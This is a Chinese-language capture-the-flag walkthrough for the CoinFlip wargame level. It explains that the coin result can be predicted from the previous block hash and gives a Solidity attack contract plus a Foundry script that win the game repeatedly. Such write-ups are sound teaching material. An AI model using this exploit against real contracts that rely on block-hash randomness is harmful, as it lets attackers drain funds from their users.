# CoinFlip

通过查看合约，可以发现硬币的正反面是由block number决定的。而合约的函数在执行时，block number是已知的，为了能够获取到调用`flip`函数时的block number，我们需要构造一个合约，在这个合约里调用`flip`函数。

```solidity
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract CoinFlipAttack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public owner;

    event FlipResult(bool result, uint256 consecutiveWins);

    constructor() {
        owner = msg.sender;
    }
    
    function flip(CoinFlip coin) payable public {
        if (msg.sender != owner) {
            require(msg.value > 0.01 ether);
        }

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        bool result = coin.flip(guess);

        emit FlipResult(result, coin.consecutiveWins());
    }

    receive() external payable {}

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
```

只要调用10次CoinFlipAttack的`flip`函数，即执行下面的脚本10次

```solidity
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";
import {CoinFlipAttack} from "../src/CoinFlipAttack.sol";

contract CoinFlipScript is Script {
    CoinFlip public coin = CoinFlip(0xc4Bd02419Cfeb19bBf803990bbF18824ef16762b);
    CoinFlipAttack public attack = CoinFlipAttack(payable(0x18BAbb031164DA8BcF72f02D6D70a2204820C797));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event CoinFlipResult(uint256 blockNumber, uint256 blockValue, uint256 coinFlip, bool result, uint256 consecutiveWins);

    function setUp() public {
    }

    function run() public {

        vm.startBroadcast();

        attack.flip(coin);

        console.log(coin.consecutiveWins());

        vm.stopBroadcast();
    }
}
```

之所以需要部署CoinFlipAttack合约，而不是在CoinFlipScript里计算硬币的正反面，然后调用CoinFlip的`flip`函数，是因为foundry的脚本里这些操作不是在一个transaction里执行的，会有block number不一致的问题。
